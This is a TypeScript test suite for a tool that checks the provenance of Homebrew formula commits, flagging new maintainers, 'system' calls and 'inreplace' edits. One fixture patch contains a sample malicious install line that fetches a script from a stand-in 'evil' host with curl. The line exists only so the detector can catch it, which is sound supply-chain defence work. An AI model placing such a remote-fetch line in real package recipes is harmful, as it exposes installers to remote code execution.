import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import {
  fetchProvenanceBatch,
  resetProvenanceFetchers,
  setProvenanceDetailFetcher,
  setProvenanceListFetcher,
} from "@brew/provenance"
import { Package, Provenance } from "@brew/types"
import { getCachedProvenance, getKnownAuthors, recordAuthors, resetDb } from "@db"

beforeEach(() => {
  resetDb()
  resetProvenanceFetchers()
  process.env.GITHUB_TOKEN = "test-token"
})

afterEach(() => {
  resetProvenanceFetchers()
  delete process.env.GITHUB_TOKEN
  delete process.env.GH_TOKEN
})

function info(overrides: Partial<Package.Info> = {}): Package.Info {
  return {
    name: "curl",
    installedVersion: "8.4.0",
    latestVersion: "8.5.1",
    installedAt: 1_700_000_000,
    sourceModifiedAt: 1_700_000_000,
    isLeaf: true,
    installedAsDependency: false,
    installedOnRequest: true,
    pinned: false,
    outdated: true,
    needsRelink: false,
    tap: "homebrew/core",
    originTap: "homebrew/core",
    trusted: true,
    description: null,
    isCask: false,
    dateConfidence: Package.DateConfidence.Authoritative,
    homepage: null,
    ...overrides,
  }
}

describe("fetchProvenanceBatch — scope guards", () => {
  test("returns empty when no GitHub token is set", async () => {
    delete process.env.GITHUB_TOKEN
    delete process.env.GH_TOKEN
    setProvenanceListFetcher(async () => {
      throw new Error("should not be called")
    })
    const result = await fetchProvenanceBatch([info()])
    expect(result.size).toBe(0)
  })

  test("skips casks", async () => {
    let called = 0
    setProvenanceListFetcher(async () => {
      called++
      return []
    })
    await fetchProvenanceBatch([info({ isCask: true })])
    expect(called).toBe(0)
  })

  test("skips third-party taps", async () => {
    let called = 0
    setProvenanceListFetcher(async () => {
      called++
      return []
    })
    await fetchProvenanceBatch([info({ tap: "cold-brew/cold-brew" })])
    expect(called).toBe(0)
  })

  test("skips up-to-date packages", async () => {
    let called = 0
    setProvenanceListFetcher(async () => {
      called++
      return []
    })
    await fetchProvenanceBatch([info({ outdated: false })])
    expect(called).toBe(0)
  })

  test("skips when installedAt is missing", async () => {
    let called = 0
    setProvenanceListFetcher(async () => {
      called++
      return []
    })
    await fetchProvenanceBatch([info({ installedAt: 0 })])
    expect(called).toBe(0)
  })
})

describe("fetchProvenanceBatch — first run seeds authors", () => {
  test("first observation does not flag new-maintainer; subsequent runs do", async () => {
    setProvenanceListFetcher(async () => [
      {
        sha: "aaa1111",
        html_url: "https://github.com/Homebrew/homebrew-core/commit/aaa1111",
        author: { login: "carlocab" },
      },
      {
        sha: "bbb2222",
        html_url: "https://github.com/Homebrew/homebrew-core/commit/bbb2222",
        author: { login: "BrewTestBot" },
      },
    ])
    setProvenanceDetailFetcher(async (_repo, sha) => ({
      sha,
      author: { login: sha === "aaa1111" ? "carlocab" : "BrewTestBot" },
      files: [{ filename: "Formula/c/curl.rb", patch: "+ # version bump only" }],
    }))

    const first = await fetchProvenanceBatch([info()])
    const firstSummary = first.get("curl")!
    expect(firstSummary.flags.find((f) => f.kind === "new-maintainer")).toBeUndefined()
    expect(firstSummary.commitsScanned).toBe(2)
    expect(getKnownAuthors("curl")).toEqual(new Set(["carlocab", "BrewTestBot"]))

    // Second run with a brand-new author should flag.
    setProvenanceListFetcher(async () => [
      {
        sha: "ccc3333",
        html_url: "https://github.com/Homebrew/homebrew-core/commit/ccc3333",
        author: { login: "newcomer-99" },
      },
    ])
    setProvenanceDetailFetcher(async (_repo, sha) => ({
      sha,
      author: { login: "newcomer-99" },
      files: [{ filename: "Formula/c/curl.rb", patch: "+ # innocuous edit" }],
    }))
    // Bust the per-formula cache so the second run actually re-fetches.
    resetDb()
    recordAuthors("curl", ["carlocab", "BrewTestBot"])
    const second = await fetchProvenanceBatch([info()])
    const secondSummary = second.get("curl")!
    expect(secondSummary.flags).toContainEqual(
      expect.objectContaining({
        kind: Provenance.FlagKind.NewMaintainer,
        commitSha: "ccc3333",
      }),
    )
    expect(getKnownAuthors("curl").has("newcomer-99")).toBe(true)
  })
})

describe("fetchProvenanceBatch — heuristic flags", () => {
  beforeEach(() => {
    // Seed authors so first-run guard doesn't suppress new-maintainer.
    recordAuthors("curl", ["BrewTestBot"])
  })

  test("system-call pattern in added line raises a flag", async () => {
    setProvenanceListFetcher(async () => [{ sha: "abc1234", html_url: "u/abc1234", author: { login: "BrewTestBot" } }])
    setProvenanceDetailFetcher(async (_repo, sha) => ({
      sha,
      author: { login: "BrewTestBot" },
      files: [
        {
          filename: "Formula/c/curl.rb",
          patch:
            '@@ -10,3 +10,4 @@\n   def install\n+    system "curl", "-fsSL", "https://evil/x.sh"\n     bin.install "curl"\n   end',
        },
      ],
    }))

    const result = await fetchProvenanceBatch([info()])
    const flags = result.get("curl")!.flags
    expect(flags.some((f) => f.kind === Provenance.FlagKind.SystemCall)).toBe(true)
  })

  test("inreplace pattern in added line raises a flag", async () => {
    setProvenanceListFetcher(async () => [{ sha: "abc1234", html_url: "u/abc1234", author: { login: "BrewTestBot" } }])
    setProvenanceDetailFetcher(async (_repo, sha) => ({
      sha,
      author: { login: "BrewTestBot" },
      files: [
        {
          filename: "Formula/c/curl.rb",
          patch: '@@ -1 +1,2 @@\n+    inreplace "src/foo.c", "foo", "bar"',
        },
      ],
    }))

    const result = await fetchProvenanceBatch([info()])
    expect(result.get("curl")!.flags.some((f) => f.kind === Provenance.FlagKind.Inreplace)).toBe(true)
  })

  test("removed line containing system call does NOT raise a flag", async () => {
    setProvenanceListFetcher(async () => [{ sha: "abc1234", html_url: "u/abc1234", author: { login: "BrewTestBot" } }])
    setProvenanceDetailFetcher(async (_repo, sha) => ({
      sha,
      author: { login: "BrewTestBot" },
      files: [
        {
          filename: "Formula/c/curl.rb",
          patch: '@@ -10,4 +10,3 @@\n-    system "curl", "-fsSL", "http://x"\n     bin.install "curl"',
        },
      ],
    }))

    const result = await fetchProvenanceBatch([info()])
    expect(result.get("curl")!.flags).toEqual([])
  })

  test("ignores patches in sibling files", async () => {
    setProvenanceListFetcher(async () => [{ sha: "abc1234", html_url: "u/abc1234", author: { login: "BrewTestBot" } }])
    setProvenanceDetailFetcher(async (_repo, sha) => ({
      sha,
      author: { login: "BrewTestBot" },
      files: [
        {
          filename: "Casks/some-other.rb",
          patch: '+    system "curl", "-fsSL", "http://x"',
        },
      ],
    }))
    const result = await fetchProvenanceBatch([info()])
    expect(result.get("curl")!.flags).toEqual([])
  })
})

describe("fetchProvenanceBatch — caching and error paths", () => {
  test("uses cached summary on second call (no refetch)", async () => {
    let calls = 0
    setProvenanceListFetcher(async () => {
      calls++
      return [{ sha: "abc1234", html_url: "u/abc1234", author: { login: "BrewTestBot" } }]
    })
    setProvenanceDetailFetcher(async (_repo, sha) => ({
      sha,
      author: { login: "BrewTestBot" },
      files: [{ filename: "Formula/c/curl.rb", patch: "+ # noop" }],
    }))

    await fetchProvenanceBatch([info()])
    await fetchProvenanceBatch([info()])
    expect(calls).toBe(1)
    expect(getCachedProvenance("curl")).not.toBeNull()
  })

  test("network failure results in no entry rather than throwing", async () => {
    setProvenanceListFetcher(async () => {
      throw new Error("rate limited")
    })
    const result = await fetchProvenanceBatch([info()])
    expect(result.size).toBe(0)
  })

  test("commit detail fetch failure still records the commit but skips patch flags", async () => {
    setProvenanceListFetcher(async () => [{ sha: "abc1234", html_url: "u/abc1234", author: { login: "BrewTestBot" } }])
    setProvenanceDetailFetcher(async () => null)
    const result = await fetchProvenanceBatch([info()])
    const summary = result.get("curl")
    expect(summary?.commitsScanned).toBe(1)
    // System-call/inreplace flags require patch content; null detail → no flags.
    const heuristicFlags = (summary?.flags ?? []).filter((f) => f.kind !== Provenance.FlagKind.NewMaintainer)
    expect(heuristicFlags).toEqual([])
  })
})
